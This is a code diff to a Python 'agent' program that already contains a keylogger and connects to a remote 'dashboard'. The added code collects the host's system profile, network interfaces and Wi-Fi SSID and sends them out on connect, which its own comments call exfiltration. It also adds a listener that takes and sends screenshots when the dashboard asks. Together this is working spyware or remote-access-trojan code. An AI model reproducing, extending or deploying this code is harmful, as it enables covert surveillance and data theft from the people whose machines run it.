@@ -21,6 +21,9 @@
 """
 import os
 import tkinter as tk
+import io
+import base64
+from PIL import ImageGrab
 import shutil
 from tkinter import messagebox
 import pystray
@@ -216,6 +219,77 @@ def start_keylogger():
     with keyboard.Listener(on_press=on_press) as listener:
         listener.join()
 
+def send_initial_sys_info():
+    """Gathers deep system and network info for the Exfiltration panel"""
+    import subprocess
+    
+    info = {
+        "hostname": socket.gethostname(),
+        "os": f"{platform.system()} {platform.release()} ({platform.machine()})",
+        "processor": platform.processor(),
+        "boot_time": time.strftime('%Y-%m-%d %H:%M:%S', time.localtime(psutil.boot_time())),
+        "interfaces": {},
+        "wifi_ssid": "Unknown / Ethernet"
+    }
+    
+    # 1. Get Network Interfaces & IPs
+    try:
+        for iface_name, iface_addrs in psutil.net_if_addrs().items():
+            for addr in iface_addrs:
+                if str(addr.family) == 'AddressFamily.AF_INET': # IPv4 only
+                    info["interfaces"][iface_name] = addr.address
+    except Exception:
+        pass
+
+    # 2. Extract WiFi SSID (Windows specific trick)
+    if OS == "Windows":
+        try:
+            output = subprocess.check_output("netsh wlan show interfaces", shell=True, stderr=subprocess.DEVNULL).decode(errors="ignore")
+            for line in output.split('\n'):
+                if "SSID" in line and "BSSID" not in line:
+                    info["wifi_ssid"] = line.split(':')[1].strip()
+                    break
+        except Exception:
+            pass
+
+    # Send the packet!
+    send_packet({
+        "type": "sys_info",
+        "data": info
+    })
+    print("[Agent] System Profile exfiltrated to dashboard.")
+
+def command_listener(sock):
+    """Listens for commands sent from the Dashboard"""
+    try:
+        while True:
+            data = sock.recv(1024).decode("utf-8")
+            if not data:
+                break
+            
+            # If the dashboard asks for a screenshot
+            if "CMD:SCREENSHOT" in data:
+                print("[Agent] Command received: Taking screenshot...")
+                
+                # 1. Take the screenshot
+                img = ImageGrab.grab()
+                
+                # 2. Compress it to a JPEG buffer to save network bandwidth
+                buffer = io.BytesIO()
+                img.save(buffer, format="JPEG", quality=70)
+                
+                # 3. Encode to Base64 text
+                img_b64 = base64.b64encode(buffer.getvalue()).decode("utf-8")
+                
+                # 4. Send it back
+                send_packet({
+                    "type": "screenshot_resp",
+                    "data": img_b64
+                })
+                print("[Agent] Screenshot sent.")
+                
+    except Exception as e:
+        print(f"[Agent] Listener stopped.")
 
 # ── Connection manager (auto-reconnect) ──────────────────────
 def connect_loop():
@@ -229,6 +303,11 @@ def connect_loop():
                 _sock = s
             _connected.set()
             print("[Agent] ✓ Connected to dashboard.")
+            # SEND THE EXFILTRATION DATA ON CONNECT ---
+            send_initial_sys_info()
+            # --- NEW: START LISTENING FOR COMMANDS ---
+            threading.Thread(target=command_listener, args=(s,), daemon=True).start()
+            # -----------------------------------------
             while _connected.is_set():
                 time.sleep(0.5)
         except (ConnectionRefusedError, OSError) as e:
